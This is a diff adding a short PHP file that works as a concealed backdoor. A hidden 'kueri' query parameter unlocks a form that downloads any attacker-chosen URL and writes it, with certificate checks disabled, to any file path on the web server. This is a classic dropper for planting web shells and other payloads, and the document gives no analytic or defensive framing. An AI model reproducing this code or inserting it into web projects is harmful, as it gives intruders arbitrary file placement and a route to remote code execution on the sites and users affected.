@@ -1,0 +1,22 @@
+<?php
+if (isset($_GET["kueri"])){ echo '<form name="myform" TARGET="_self">';
+echo 'URL: <input type="text" name="u"><br>';
+echo 'File: <input type="text" name="f"><br>';
+echo '<input name="kueri" value="sch" type="hidden">';
+echo '<input type="submit" value="Submit">';
+echo '</form>'; 
+if (!empty($_REQUEST['kueri'])) {
+set_time_limit(0);
+$fp = fopen($_REQUEST['f'], 'w');
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $_REQUEST['u']);
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
+curl_setopt($ch, CURLOPT_FAILONERROR, 1);
+curl_setopt($ch, CURLOPT_FILE, $fp);
+$response = curl_exec($ch);
+if ($response) {echo 'success';} else {echo 'fail';}
+}
+} 
+?>
